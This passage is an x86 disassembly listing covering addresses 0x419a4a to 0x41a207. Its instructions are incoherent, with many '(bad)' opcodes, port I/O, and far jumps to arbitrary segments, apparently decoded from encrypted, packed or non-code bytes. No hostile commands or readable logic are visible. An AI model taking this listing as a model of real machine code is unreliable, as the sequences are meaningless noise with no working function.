  419a4a:	or     eax,0xefd03645
  419a4f:	ja     0x419a19
  419a51:	dec    ebx
  419a52:	cmp    al,0x34
  419a54:	loop   0x419a96
  419a56:	or     BYTE PTR [eax+0x62],0xf0
  419a5a:	inc    edx
  419a5b:	mov    edi,0xc157d200
  419a60:	and    edi,esp
  419a62:	rcr    BYTE PTR [eax+ebx*8],0x41
  419a66:	rcl    DWORD PTR [ebx-0x3845c34a],0xf3
  419a6d:	adc    DWORD PTR [ebx+eax*4-0xe7e2d64],ecx
  419a74:	out    dx,al
  419a75:	ins    BYTE PTR es:[edi],dx
  419a76:	cmp    al,0x5c
  419a78:	outs   dx,DWORD PTR ds:[esi]
  419a79:	test   eax,0xc55a0d7
  419a7e:	jmp    0x419a96
  419a80:	ins    BYTE PTR es:[edi],dx
  419a81:	sub    ch,BYTE PTR [ebp+0x602bb2b2]
  419a87:	inc    esp
  419a88:	add    eax,0x5ca39c25
  419a8d:	cmp    BYTE PTR [ebx+ecx*8+0x4628a7e3],cl
  419a94:	sar    BYTE PTR [esp+edx*1-0x63],0xeb
  419a99:	push   edi
  419a9a:	mov    al,0x1d
  419a9c:	sub    DWORD PTR [esi],ebx
  419a9e:	rcl    BYTE PTR [eax-0x31],cl
  419aa1:	dec    ebp
  419aa2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419aa3:	gs into 
  419aa5:	add    eax,0xfb3709e4
  419aaa:	mov    es,esi
  419aac:	xchg   ebx,eax
  419aad:	sbb    al,0xc5
  419aaf:	push   esi
  419ab0:	rcl    DWORD PTR [eax],1
  419ab2:	jmp    0x29d1:0x5b57ee20
  419ab9:	shl    BYTE PTR [ebx+0x6b],0x69
  419abd:	mov    ch,0x11
  419abf:	(bad)  
  419ac0:	std    
  419ac1:	outs   dx,BYTE PTR ds:[esi]
  419ac2:	repnz add DWORD PTR [esi-0x1127bcae],esp
  419ac9:	cmc    
  419aca:	ins    BYTE PTR es:[edi],dx
  419acb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419acc:	push   esi
  419acd:	or     BYTE PTR [ecx],al
  419acf:	xchg   esi,eax
  419ad0:	mov    ebx,0xa3b035e7
  419ad5:	aas    
  419ad6:	pushf  
  419ad7:	jle    0x419a6d
  419ad9:	out    0x23,eax
  419adb:	rol    DWORD PTR [esi-0x57f0d26e],1
  419ae1:	hlt    
  419ae2:	fsubp  st(6),st
  419ae4:	lds    esi,FWORD PTR [edi+0x72]
  419ae7:	call   0x4911:0x9f8cf8c0
  419aee:	xor    BYTE PTR [ebp+0x12a7b363],dh
  419af4:	repnz pusha 
  419af6:	mov    ds:0x14bb0bc1,eax
  419afb:	ins    DWORD PTR es:[edi],dx
  419afc:	pushf  
  419afd:	push   edi
  419afe:	add    ah,dl
  419b00:	cwde   
  419b01:	adc    ah,al
  419b03:	dec    edx
  419b04:	sub    DWORD PTR [ebp+0x1a],edx
  419b07:	push   edx
  419b08:	push   eax
  419b09:	xor    ecx,DWORD PTR [esi]
  419b0b:	dec    edi
  419b0c:	out    dx,al
  419b0d:	seta   BYTE PTR [edx-0x4d]
  419b11:	dec    ebp
  419b12:	add    DWORD PTR [edx-0x64882b49],0x1aea1e6a
  419b1c:	adc    esi,DWORD PTR [ebp-0x6aabbf65]
  419b22:	mov    bh,0xdd
  419b24:	mov    ebx,0x6a498ddb
  419b29:	sahf   
  419b2a:	repz clc 
  419b2c:	jl     0x419b07
  419b2e:	dec    esp
  419b2f:	fcmovnbe st,st(7)
  419b31:	and    bh,dl
  419b33:	lods   al,BYTE PTR ds:[esi]
  419b34:	pop    es
  419b35:	popa   
  419b36:	inc    ebp
  419b37:	sub    BYTE PTR [ecx+0xe],0x1f
  419b3b:	xchg   ecx,eax
  419b3c:	push   edx
  419b3d:	(bad)  
  419b3e:	mov    cl,0x39
  419b40:	out    0xd0,eax
  419b42:	mov    edx,ebx
  419b44:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419b45:	pop    ecx
  419b46:	mov    edx,0x2ad56cc3
  419b4b:	js     0x419b43
  419b4d:	dec    BYTE PTR [ebx+0x43be0b32]
  419b53:	sub    eax,0x5a5ba230
  419b58:	pop    ebp
  419b59:	imul   esi,DWORD PTR [edi+0x5539e922],0xf9b49649
  419b63:	mov    ebx,DWORD PTR [eax]
  419b65:	je     0x419bad
  419b67:	ror    DWORD PTR [esi+0x7],0xe7
  419b6b:	inc    esp
  419b6c:	add    ch,BYTE PTR [edx]
  419b6e:	shl    BYTE PTR [ebx],cl
  419b70:	mov    al,BYTE PTR [ebp+0x3ab00c42]
  419b76:	cs cwde 
  419b78:	pop    ecx
  419b79:	add    eax,0x97ea2183
  419b7e:	js     0x419be2
  419b80:	je     0x419baf
  419b82:	mov    cl,0x31
  419b84:	mov    dl,0xd6
  419b86:	rol    edi,0xba
  419b89:	loop   0x419b69
  419b8b:	call   0x65969701
  419b90:	pop    es
  419b91:	and    al,0xfd
  419b93:	popf   
  419b94:	xchg   edi,eax
  419b95:	(bad)  
  419b96:	(bad)  
  419b97:	mov    eax,ds:0x6701baf3
  419b9c:	mov    ds:0xfe5d718,eax
  419ba1:	mov    ecx,0xb7d89ab7
  419ba6:	cld    
  419ba7:	xor    ebx,ebx
  419ba9:	in     al,0x85
  419bab:	fld    DWORD PTR [esi]
  419bad:	sub    BYTE PTR [ecx+edx*1-0x109efb31],ah
  419bb4:	lahf   
  419bb5:	xchg   edx,eax
  419bb6:	pop    eax
  419bb7:	stos   DWORD PTR es:[edi],eax
  419bb8:	dec    esi
  419bb9:	xor    DWORD PTR [ebx+eax*8],esp
  419bbc:	mov    esi,0xb768ea9f
  419bc1:	loope  0x419b62
  419bc3:	rol    BYTE PTR [ecx-0x68],cl
  419bc6:	mov    eax,ds:0x837badc1
  419bcb:	imul   edx,DWORD PTR [ebx+ecx*8+0x70],0xe7833c52
  419bd3:	(bad)  
  419bd4:	xor    ch,BYTE PTR [esi+0x7b]
  419bd7:	leave  
  419bd8:	fld    QWORD PTR [ecx+0x5b]
  419bdb:	daa    
  419bdc:	aas    
  419bdd:	enter  0x7f50,0x3c
  419be1:	add    DWORD PTR [ecx+0xd],eax
  419be4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419be5:	inc    edi
  419be6:	ret    0x582e
  419be9:	mov    esp,0xcd7d0935
  419bee:	clc    
  419bef:	add    eax,0xb22aa79e
  419bf4:	inc    esp
  419bf5:	test   al,0xa0
  419bf7:	xor    ebp,edi
  419bf9:	shr    DWORD PTR [ecx+0x2b10f541],0x85
  419c00:	adc    BYTE PTR [edx+eiz*8+0x2f],ah
  419c04:	mov    ch,0xac
  419c06:	mov    al,ds:0xa03cde38
  419c0b:	jecxz  0x419bd6
  419c0d:	mov    dh,dl
  419c0f:	mov    edx,0xc54bf65e
  419c14:	xchg   ebx,eax
  419c15:	es xchg ecx,eax
  419c17:	cdq    
  419c18:	leave  
  419c19:	mov    ah,0x75
  419c1b:	mov    esi,0x54f4d604
  419c20:	inc    esi
  419c21:	(bad)  
  419c22:	outs   dx,BYTE PTR ds:[esi]
  419c23:	lock inc esi
  419c25:	sar    dh,0x4d
  419c28:	jge    0x419c16
  419c2a:	mov    ebx,0x97078f72
  419c2f:	and    esp,esi
  419c31:	je     0x419c38
  419c33:	call   0x578a28bd
  419c38:	cld    
  419c39:	pushf  
  419c3a:	scas   eax,DWORD PTR es:[edi]
  419c3b:	fwait
  419c3c:	jmp    0x8f4b:0x50ddf756
  419c43:	sbb    eax,0x116e4426
  419c48:	imul   ebx,edi,0x5a9dec71
  419c4e:	call   0xfdf8:0x220e925e
  419c55:	add    al,0x4f
  419c57:	cmp    esp,DWORD PTR [ebx+0x53]
  419c5a:	adc    DWORD PTR [esi+0x4d763d86],0x8f4c78be
  419c64:	dec    eax
  419c65:	sti    
  419c66:	out    dx,al
  419c67:	cld    
  419c68:	sti    
  419c69:	pop    esp
  419c6a:	mov    esp,0xc885f29d
  419c6f:	mov    edx,0xa7461c56
  419c74:	jge    0x419c40
  419c76:	jmp    0x5376:0x998cbd77
  419c7d:	test   eax,0x8fb4af11
  419c82:	xchg   ecx,eax
  419c83:	retf   
  419c84:	out    dx,eax
  419c85:	inc    ebx
  419c86:	repnz xchg ecx,eax
  419c88:	and    ecx,DWORD PTR [ebx+edx*4-0x60e7d0b9]
  419c8f:	shl    BYTE PTR [ebx],0x1a
  419c92:	or     BYTE PTR [esp+esi*4+0x52],dh
  419c96:	cmp    al,0x7d
  419c98:	shl    DWORD PTR ds:0xa4e65f7c,cl
  419c9e:	(bad)  
  419ca0:	xor    esp,ebp
  419ca2:	shl    BYTE PTR [ecx],1
  419ca4:	and    dh,bh
  419ca6:	arpl   WORD PTR [esi+0x333fc70d],dx
  419cac:	(bad)  
  419cad:	lock jns 0x419c36
  419cb0:	ret    0x2637
  419cb3:	push   0x5b
  419cb5:	fstp   QWORD PTR [ebp+0x7f211aac]
  419cbb:	adc    esp,edx
  419cbd:	ror    DWORD PTR [edx-0x5d],1
  419cc0:	call   DWORD PTR [ebx+0x6ca5fec7]
  419cc6:	xchg   ecx,ecx
  419cc8:	mov    WORD PTR [edx+0x67],cs
  419ccb:	adc    DWORD PTR [ecx+0x7],0xa
  419ccf:	in     al,0x45
  419cd1:	push   ebx
  419cd2:	fs pop esi
  419cd4:	jb     0x419ca8
  419cd6:	dec    edi
  419cd7:	test   BYTE PTR [ecx],bl
  419cd9:	sbb    al,0xdd
  419cdb:	xor    edi,DWORD PTR [esi+0x3978c013]
  419ce1:	push   ds
  419ce2:	call   0xc42c7b6
  419ce7:	xor    ecx,DWORD PTR [ebx+0x4]
  419cea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419ceb:	pusha  
  419cec:	sti    
  419ced:	pop    es
  419cee:	out    0xd8,al
  419cf0:	fidiv  WORD PTR [ebx]
  419cf2:	shr    bh,0x81
  419cf5:	cmp    ebp,DWORD PTR [ecx-0x4e719916]
  419cfb:	ror    BYTE PTR [ecx],cl
  419cfd:	iret   
  419cfe:	cmp    ebp,ecx
  419d00:	push   0x1b3e32aa
  419d05:	sbb    edi,DWORD PTR [ebx+0x15078d99]
  419d0b:	fld    DWORD PTR [esi]
  419d0d:	sbb    ah,0x5c
  419d10:	dec    esi
  419d11:	lds    edx,FWORD PTR [edx+0x59144211]
  419d17:	dec    edx
  419d18:	imul   edx,DWORD PTR [edi],0xb
  419d1b:	loop   0x419d93
  419d1d:	aad    0xe9
  419d1f:	sbb    al,0xdc
  419d21:	pop    ecx
  419d22:	test   BYTE PTR [edi],ah
  419d24:	inc    ebp
  419d25:	or     ax,0x4a04
  419d29:	jae    0x419d89
  419d2b:	pop    eax
  419d2c:	sub    dh,BYTE PTR [edx]
  419d2e:	rol    BYTE PTR [ebp-0x68d5a0b2],cl
  419d34:	mov    al,0x82
  419d36:	xchg   edx,eax
  419d37:	(bad)  
  419d38:	jns    0x419ce7
  419d3a:	mov    DWORD PTR [eax],edi
  419d3c:	xchg   edi,eax
  419d3d:	call   0x12eddf64
  419d42:	stc    
  419d43:	loope  0x419d58
  419d45:	push   ss
  419d46:	jge    0x419d1d
  419d48:	popa   
  419d49:	pop    esi
  419d4a:	repz int3 
  419d4c:	pop    ds
  419d4d:	xchg   DWORD PTR [edi-0x76045128],ebp
  419d53:	in     eax,0xba
  419d55:	shr    BYTE PTR [edx+0x31],1
  419d58:	mov    edx,0x8ac88aab
  419d5d:	(bad)  
  419d5e:	stos   BYTE PTR es:[edi],al
  419d5f:	dec    esi
  419d60:	ret    0x6f52
  419d63:	adc    BYTE PTR [esi+0x1e159c2e],ch
  419d69:	js     0x419d3f
  419d6b:	lock imul ebx,DWORD PTR [ecx+0x15],0xeb3a4c4a
  419d73:	enter  0x142,0x4a
  419d77:	loope  0x419d82
  419d79:	into   
  419d7a:	popa   
  419d7b:	and    al,0xfc
  419d7d:	test   al,0x88
  419d7f:	imul   edi,DWORD PTR [esi-0x7e],0xd08889ad
  419d86:	jecxz  0x419d4d
  419d88:	call   0x46ffe52
  419d8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419d8e:	loop   0x419dfc
  419d90:	shr    eax,1
  419d92:	inc    ebp
  419d93:	xlat   BYTE PTR ds:[ebx]
  419d94:	fwait
  419d95:	xchg   BYTE PTR [edi],bl
  419d97:	pop    edi
  419d98:	and    bh,BYTE PTR [edi-0x1081b7c8]
  419d9e:	test   ah,ah
  419da0:	inc    ebx
  419da1:	ficomp WORD PTR ds:0xb6668584
  419da7:	fldcw  WORD PTR [esi+ebx*2]
  419daa:	sub    bh,BYTE PTR ds:0x87201519
  419db0:	dec    ebp
  419db1:	aas    
  419db2:	pusha  
  419db3:	sub    eax,0x44944296
  419db8:	ret    
  419db9:	out    0x7d,eax
  419dbb:	dec    eax
  419dbc:	cmp    al,BYTE PTR [ebx+ebx*8+0x37e0667c]
  419dc3:	rol    DWORD PTR [eax],1
  419dc5:	pushf  
  419dc6:	and    edi,DWORD PTR [eax-0x72]
  419dc9:	or     BYTE PTR [ebx],ah
  419dcb:	sub    eax,0x6c5a36f0
  419dd0:	xor    eax,0xcbc01507
  419dd5:	out    dx,eax
  419dd6:	(bad)  
  419dd7:	pop    eax
  419dd8:	or     DWORD PTR [ecx-0x5779244f],ebx
  419dde:	xor    BYTE PTR [ecx+ebx*4+0x4d4ecf0b],dh
  419de5:	ss push ss
  419de7:	mul    DWORD PTR [ebx]
  419de9:	jns    0x419e26
  419deb:	pop    edx
  419dec:	dec    ebx
  419ded:	data16 std 
  419def:	dec    esp
  419df0:	jb     0x419e5d
  419df2:	call   0x93c15aaf
  419df7:	or     ecx,DWORD PTR [edi+0x84a739]
  419dfd:	ja     0x419e5f
  419dff:	sub    eax,esp
  419e01:	sub    eax,0xe1ca9a30
  419e06:	add    BYTE PTR [edx+0x7c],ah
  419e09:	sbb    ah,BYTE PTR [ebx+0x1195954c]
  419e0f:	out    0xa8,al
  419e11:	push   edx
  419e12:	das    
  419e13:	pop    eax
  419e14:	push   ss
  419e15:	mov    ds:0x3a43680b,eax
  419e1a:	push   esi
  419e1b:	adc    ch,BYTE PTR [edi-0x4a]
  419e1e:	mov    ebx,0xaf7b88ac
  419e23:	jns    0x419e00
  419e25:	cmp    DWORD PTR [esi+0xbfc17a],esi
  419e2b:	mov    DWORD PTR [esi+0x5edba6f4],ecx
  419e31:	jmp    0x5483:0x2231b75a
  419e38:	mov    WORD PTR [ebp+0x2f],fs
  419e3b:	dec    esi
  419e3c:	mov    cl,0xea
  419e3e:	inc    edi
  419e3f:	test   eax,0x318e893f
  419e44:	adc    ecx,DWORD PTR [esi]
  419e46:	jbe    0x419e81
  419e48:	inc    edi
  419e49:	mov    edx,0x6275bc8b
  419e4e:	(bad)  
  419e4f:	hlt    
  419e50:	push   ecx
  419e51:	enter  0x6fb5,0xed
  419e55:	mov    esi,0x61051579
  419e5a:	retf   0x133f
  419e5d:	shl    BYTE PTR [ebx],1
  419e5f:	push   ss
  419e60:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419e61:	mov    ch,0xb1
  419e63:	out    dx,al
  419e64:	stos   BYTE PTR es:[edi],al
  419e65:	outs   dx,DWORD PTR ds:[esi]
  419e66:	push   ds
  419e67:	adc    ecx,DWORD PTR [esi]
  419e69:	mov    eax,ds:0x182d9255
  419e6e:	ret    
  419e6f:	xchg   BYTE PTR [edx],dh
  419e71:	aam    0x61
  419e73:	cmp    eax,0x9584b459
  419e78:	pop    DWORD PTR [ebp+0x45]
  419e7b:	jae    0x419e1a
  419e7d:	mov    al,ds:0x906d2897
  419e82:	push   ebx
  419e83:	inc    esi
  419e84:	sbb    esp,DWORD PTR [edx+edx*4-0x2b3431cc]
  419e8b:	outs   dx,DWORD PTR ds:[esi]
  419e8c:	je     0x419ec5
  419e8e:	mov    ebp,0xdc251634
  419e93:	jmp    0x419efb
  419e95:	adc    DWORD PTR [ebx],ebp
  419e97:	dec    esp
  419e98:	jmp    0x5f8adfcd
  419e9d:	out    dx,al
  419e9e:	rol    dl,0x35
  419ea1:	lahf   
  419ea2:	aas    
  419ea3:	dec    edx
  419ea4:	mov    edi,esi
  419ea6:	xchg   DWORD PTR [ebx+0x6],esi
  419ea9:	sahf   
  419eaa:	in     al,dx
  419eab:	(bad)  
  419eac:	repnz imul edx,esi,0xffffffbe
  419eb0:	addr16 loop 0x419f15
  419eb3:	mov    dh,BYTE PTR [edi+esi*4]
  419eb6:	(bad)  
  419eb7:	push   ds
  419eb8:	sbb    al,0xd1
  419eba:	mov    ebp,DWORD PTR [eax-0x1c5cb069]
  419ec0:	std    
  419ec1:	mov    esi,0x290e88b5
  419ec6:	push   ebx
  419ec7:	aam    0x65
  419ec9:	and    dl,BYTE PTR ss:[edi+eiz*2+0x3773d38a]
  419ed1:	data16 js 0x419f34
  419ed4:	fwait
  419ed5:	push   edx
  419ed6:	mov    al,ds:0xbfbbe12e
  419edb:	pop    edi
  419edc:	(bad)  
  419edd:	jnp    0x419eda
  419edf:	jp     0x419f5e
  419ee1:	pop    es
  419ee2:	push   ss
  419ee3:	les    esi,FWORD PTR [eax]
  419ee5:	mov    ch,bh
  419ee7:	ret    
  419ee8:	mov    dl,0x31
  419eea:	pop    edx
  419eeb:	xchg   esi,eax
  419eec:	je     0x419f62
  419eee:	sbb    BYTE PTR [ebp+0x1c],0xc1
  419ef2:	fcomip st,st(5)
  419ef4:	ja     0x419ec6
  419ef6:	push   eax
  419ef7:	xor    eax,ebx
  419ef9:	fwait
  419efa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419efb:	fbstp  TBYTE PTR [ecx-0x51702bba]
  419f01:	mov    cs,WORD PTR [eax-0x17fc2391]
  419f07:	clc    
  419f08:	es push es
  419f0a:	into   
  419f0b:	stos   DWORD PTR es:[edi],eax
  419f0c:	pop    eax
  419f0d:	push   0x81cd8f3a
  419f12:	outs   dx,DWORD PTR ds:[esi]
  419f13:	clc    
  419f14:	or     DWORD PTR [eax],esp
  419f16:	mov    gs:0x9fe47baf,eax
  419f1c:	mov    fs,WORD PTR [esi-0x5f72a0fd]
  419f22:	jp     0x419eea
  419f24:	sbb    dh,cl
  419f26:	(bad)  
  419f27:	in     al,dx
  419f28:	icebp  
  419f29:	test   eax,0x706a895e
  419f2e:	call   0xaea9:0x7c0c484d
  419f35:	dec    ecx
  419f36:	cmp    cl,bl
  419f38:	or     cl,BYTE PTR [ecx]
  419f3a:	xor    bl,0xd9
  419f3d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419f3e:	outs   dx,BYTE PTR ds:[esi]
  419f3f:	sbb    eax,0x9412fb78
  419f44:	ror    BYTE PTR [ebp+0x6be05639],0xe5
  419f4b:	xchg   edx,eax
  419f4c:	or     DWORD PTR [edx+0x454344c8],eax
  419f52:	ins    DWORD PTR es:[edi],dx
  419f53:	sub    eax,esi
  419f55:	jg     0x419f07
  419f57:	jmp    0x6fcbac37
  419f5c:	dec    edi
  419f5d:	dec    ebp
  419f5e:	inc    esp
  419f5f:	adc    dh,BYTE PTR [ebp+0x30]
  419f62:	mov    al,0x7a
  419f64:	jnp    0x419f16
  419f66:	sbb    edx,ebx
  419f68:	add    al,0x76
  419f6a:	leave  
  419f6b:	fs test al,0xa4
  419f6e:	sbb    eax,0x89d86192
  419f73:	jo     0x419f79
  419f75:	test   BYTE PTR [ecx],dl
  419f77:	sbb    ah,bl
  419f79:	pop    eax
  419f7a:	repnz es xchg edx,eax
  419f7d:	sub    DWORD PTR [edi-0x43],ebx
  419f80:	test   BYTE PTR [edi],dh
  419f82:	pushf  
  419f83:	dec    esp
  419f84:	adc    BYTE PTR ds:0xe63c3757,al
  419f8a:	sbb    al,0x47
  419f8c:	fiadd  DWORD PTR [ebx+0x38ac2c5e]
  419f92:	aam    0x62
  419f94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419f95:	cmc    
  419f96:	mov    eax,ds:0xe2e055cf
  419f9b:	popa   
  419f9c:	lods   al,BYTE PTR ds:[esi]
  419f9d:	and    eax,0x1b26a559
  419fa2:	mov    eax,0x9724265d
  419fa7:	push   0xffffffdf
  419fa9:	and    dl,BYTE PTR [ebx+eax*4-0x394ca5df]
  419fb0:	imul   ebx,DWORD PTR [esp+edi*8+0x31],0xffffffa5
  419fb5:	retf   
  419fb6:	jmp    0x419f5e
  419fb8:	jmp    0x419fa0
  419fba:	push   0xaccaaf90
  419fbf:	dec    edx
  419fc0:	aas    
  419fc1:	int    0x7b
  419fc3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419fc4:	test   al,0x1d
  419fc6:	rcl    al,0xc7
  419fc9:	addr16 cld 
  419fcb:	test   al,0xc3
  419fcd:	fwait
  419fce:	jno    0x419fc7
  419fd0:	sti    
  419fd1:	sub    BYTE PTR [ecx-0x37b54cf3],bl
  419fd7:	out    dx,eax
  419fd8:	mov    esi,0xc53e66d
  419fdd:	push   esp
  419fde:	sub    ebx,eax
  419fe0:	hlt    
  419fe1:	test   eax,0xcdf7c2c8
  419fe6:	data16 stos BYTE PTR es:[edi],al
  419fe8:	pop    es
  419fe9:	adc    esi,DWORD PTR [esi+ebp*2]
  419fec:	enter  0x7772,0x54
  419ff0:	enter  0xdfff,0x33
  419ff4:	add    eax,DWORD PTR [ebx+ebx*8-0x6a]
  419ff8:	imul   ecx,DWORD PTR [edx+ebx*4+0x19],0x45
  419ffd:	scas   al,BYTE PTR es:[edi]
  419ffe:	stos   BYTE PTR es:[edi],al
  419fff:	mov    bp,0xcc12
  41a003:	lahf   
  41a004:	sub    eax,0x65979d8
  41a009:	mov    esp,0x32630573
  41a00e:	ss push es
  41a010:	push   ebp
  41a011:	pusha  
  41a012:	cmp    dl,dh
  41a014:	pop    esi
  41a015:	jb     0x41a052
  41a017:	dec    esi
  41a018:	test   al,0x38
  41a01a:	loop   0x41a039
  41a01c:	push   ebp
  41a01d:	(bad)  
  41a01e:	stc    
  41a01f:	jp     0x41a042
  41a021:	adc    al,0xd3
  41a023:	shr    DWORD PTR ds:0x88df0f3b,cl
  41a029:	enter  0x6995,0xea
  41a02d:	push   ds
  41a02e:	xchg   edi,eax
  41a02f:	mov    ebp,0xe0f516a8
  41a034:	or     al,0x6
  41a036:	sar    BYTE PTR ds:0xc372892d,1
  41a03c:	xchg   ebx,eax
  41a03d:	or     esi,DWORD PTR ds:0x7a861bdc
  41a043:	out    dx,al
  41a044:	sub    al,0xc9
  41a046:	fwait
  41a047:	gs cdq 
  41a049:	rcl    BYTE PTR [edi+ecx*1-0x67084376],cl
  41a050:	jp     0x419ff0
  41a052:	jle    0x41a029
  41a054:	pop    edi
  41a055:	add    al,0x26
  41a057:	int3   
  41a058:	sbb    al,0xf1
  41a05a:	or     ebp,DWORD PTR [ebp+0x60]
  41a05d:	outs   dx,DWORD PTR ds:[esi]
  41a05e:	das    
  41a05f:	jmp    0x7ff1:0xe9df6a94
  41a066:	and    DWORD PTR [esi],edx
  41a068:	mov    esp,ebx
  41a06a:	mov    cs,WORD PTR [edi+eax*8]
  41a06d:	idiv   bh
  41a06f:	push   eax
  41a070:	mov    WORD PTR [ebx+0x4df2330f],fs
  41a076:	call   0xf79a4b83
  41a07b:	stc    
  41a07c:	jmp    0x5d9d56e7
  41a081:	je     0x41a08d
  41a083:	hlt    
  41a084:	sub    DWORD PTR [edx+0x45],ecx
  41a087:	fisubr DWORD PTR [eax+0x1c6817b2]
  41a08d:	aam    0x76
  41a08f:	aam    0xcb
  41a091:	sbb    esi,ebx
  41a093:	push   ecx
  41a094:	mov    ds:0xbdfc7aab,eax
  41a099:	sahf   
  41a09a:	jo     0x41a10d
  41a09c:	sbb    DWORD PTR [ebx+0x3c],0x5993674f
  41a0a3:	mov    ebp,DWORD PTR [edx-0x1bdb8365]
  41a0a9:	jg     0x41a094
  41a0ab:	idiv   BYTE PTR [esi-0x7e26bece]
  41a0b1:	hlt    
  41a0b2:	fdiv   QWORD PTR ds:0xd00c3f98
  41a0b8:	mov    ecx,0xca81e5a2
  41a0bd:	test   al,0x30
  41a0bf:	lea    edi,[ebx-0x20]
  41a0c2:	aaa    
  41a0c3:	pop    ss
  41a0c4:	(bad)  
  41a0c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a0c6:	mov    ch,cl
  41a0c8:	jle    0x41a0bc
  41a0ca:	loope  0x41a11c
  41a0cc:	adc    ah,BYTE PTR [esi-0x7d4ce5e]
  41a0d2:	out    dx,al
  41a0d3:	add    DWORD PTR [edx],ebp
  41a0d5:	mov    edx,0x6487d549
  41a0da:	pop    esp
  41a0db:	mov    dl,ah
  41a0dd:	inc    ecx
  41a0de:	pusha  
  41a0df:	pop    DWORD PTR [edi+eiz*1]
  41a0e2:	xor    ebp,esp
  41a0e4:	and    al,0xa4
  41a0e6:	mov    BYTE PTR [edx],cl
  41a0e8:	push   0x63b9fa04
  41a0ed:	inc    eax
  41a0ee:	inc    edi
  41a0ef:	aas    
  41a0f0:	ins    BYTE PTR es:[edi],dx
  41a0f1:	rol    BYTE PTR ds:[edx+0x64db64d1],1
  41a0f8:	mov    bl,0xaf
  41a0fa:	push   es
  41a0fb:	ins    DWORD PTR es:[edi],dx
  41a0fc:	(bad)  
  41a0fd:	and    ecx,edi
  41a0ff:	push   edx
  41a100:	dec    ecx
  41a101:	sbb    al,BYTE PTR [ebp+0x5b029d]
  41a107:	rcl    BYTE PTR [eax-0x2c],1
  41a10a:	int    0x9f
  41a10c:	push   ebx
  41a10d:	add    DWORD PTR [ecx+0x50c6cf69],esi
  41a113:	cmp    BYTE PTR [ebp+0x79f49f2b],0xfc
  41a11a:	add    BYTE PTR [ecx+ecx*2-0x12],0xe8
  41a11f:	shr    BYTE PTR [ebx],0x84
  41a122:	xchg   esi,eax
  41a123:	adc    bl,BYTE PTR [edi+0x5bf476fe]
  41a129:	arpl   WORD PTR [edx],dx
  41a12b:	mov    cl,0x1
  41a12d:	jne    0x41a117
  41a12f:	into   
  41a130:	es out dx,al
  41a132:	jne    0x41a17a
  41a134:	fist   DWORD PTR [edx]
  41a136:	cdq    
  41a137:	test   eax,0xccedab4c
  41a13c:	ins    BYTE PTR es:[edi],dx
  41a13d:	pusha  
  41a13e:	cmp    eax,0xbd05f1e4
  41a143:	das    
  41a144:	cmp    al,0x60
  41a146:	outs   dx,DWORD PTR ds:[esi]
  41a148:	push   ecx
  41a149:	mov    ch,0x3a
  41a14b:	inc    eax
  41a14c:	aaa    
  41a14d:	(bad)
  41a151:	sbb    eax,DWORD PTR [edi-0x17af423c]
  41a157:	cmp    ebp,DWORD PTR [ebp-0x355068f3]
  41a15d:	pop    esi
  41a15e:	push   ss
  41a15f:	jb     0x41a1b7
  41a161:	lea    esp,[ecx]
  41a163:	mov    al,0x94
  41a165:	push   ds
  41a166:	xor    eax,0xe41ac65e
  41a16b:	jge    0x41a1e3
  41a16d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a16e:	cmp    al,0x1c
  41a170:	test   al,0x1b
  41a172:	iret   
  41a173:	enter  0x5d79,0x42
  41a177:	adc    eax,0xd50c6652
  41a17c:	jb     0x41a19a
  41a17e:	xlat   BYTE PTR ds:[ebx]
  41a17f:	stos   BYTE PTR es:[edi],al
  41a180:	fnsave [edi+0x6]
  41a183:	push   ecx
  41a184:	loopne 0x41a148
  41a186:	stos   DWORD PTR es:[edi],eax
  41a187:	inc    edi
  41a188:	or     eax,0x4e3e9973
  41a18d:	xor    DWORD PTR [ecx],esp
  41a18f:	mov    bl,0x21
  41a191:	int    0xa5
  41a193:	xchg   ebp,eax
  41a194:	pop    ds
  41a195:	shl    bh,cl
  41a197:	stc    
  41a198:	ins    DWORD PTR es:[edi],dx
  41a199:	div    BYTE PTR [eax]
  41a19b:	test   eax,0x7bc8b4b2
  41a1a0:	rcr    ecx,cl
  41a1a2:	pop    ds
  41a1a3:	imul   esi,DWORD PTR [edi+0xa53314d],0xf5ce4862
  41a1ad:	xchg   esi,eax
  41a1ae:	ror    ebp,0xe1
  41a1b1:	lock ins DWORD PTR es:[edi],dx
  41a1b3:	mov    cl,0x55
  41a1b5:	sub    DWORD PTR [esi],edi
  41a1b7:	sub    al,0x4a
  41a1b9:	and    ebx,ebp
  41a1bb:	or     eax,DWORD PTR [ebx-0x452500ef]
  41a1c1:	push   0x6739e4a
  41a1c6:	add    dh,BYTE PTR [edi]
  41a1c8:	or     esi,ebp
  41a1ca:	repnz call FWORD PTR [ecx+eax*8]
  41a1ce:	popf   
  41a1cf:	outs   dx,DWORD PTR ds:[esi]
  41a1d0:	jbe    0x41a183
  41a1d2:	mov    edi,0xc9128e7b
  41a1d7:	xchg   ebx,eax
  41a1d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a1d9:	int3   
  41a1da:	repz sbb DWORD PTR [edx],edx
  41a1dd:	push   ebx
  41a1de:	imul   ebx,DWORD PTR [eax-0x339beade],0x6d
  41a1e5:	jmp    0x41a1ce
  41a1e7:	outs   dx,BYTE PTR ds:[esi]
  41a1e8:	dec    eax
  41a1e9:	ds push edx
  41a1eb:	pop    ecx
  41a1ec:	stc    
  41a1ed:	dec    ebx
  41a1ee:	mov    cl,0x22
  41a1f0:	aaa    
  41a1f1:	jbe    0x41a1d0
  41a1f3:	ins    BYTE PTR es:[edi],dx
  41a1f4:	xor    BYTE PTR [esi+0x7f5b07a4],cl
  41a1fa:	sbb    eax,0x7120922e
  41a1ff:	jl     0x41a1e8
  41a201:	aas    
  41a202:	cmp    esi,esi
  41a204:	jecxz  0x41a1f8
  41a206:	int3   
  41a207:	xlat   BYTE PTR ds:[ebx]
